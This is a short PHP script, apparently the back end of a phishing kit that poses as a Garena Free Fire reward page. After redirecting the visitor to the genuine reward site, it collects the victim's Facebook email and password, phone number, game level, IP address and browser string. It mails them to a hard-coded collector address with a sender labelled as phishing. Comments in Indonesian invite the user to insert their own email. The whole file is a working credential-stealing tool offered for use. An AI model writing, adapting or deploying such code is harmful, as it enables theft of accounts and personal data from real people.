<?php
header("location: https://reward.ff.garena.com/");
?>
<?php
//RECODE DIKIT AUTO RUSAK 
//Author : PulberAja

$subjek = '$RESULT FF - PulberAja';
$mailto = 'fattahillah@dictricta.my.id'; //masukin email lo disini

$henpon = $_POST['fb1'];
$teha = $_POST['fb2'];
$la = $_POST['level'];
$np = $_POST['nope'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];


$body = <<<EOD
<br><hr><br>
++====[$$ INFO AKUN FF $$]====++<br>
<br>
Email Facebook : $henpon<br>
Password Facebook : $teha<br>
<br>
++====[ SUBS CHANNEL PULBERAJA]====++<br>
<br>
++====[$$ DETAIL ACCOUNT $$]====++<br>
<br>
Level Account : $la<br>
Nomor HP : $np<br>
Alamat IP : $ip<br>
Browser : $browser<br>
<br>
++===[ Udah Gitu Aja:v]====++

EOD;


$headers = "From: Info@phsing.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers);
?>
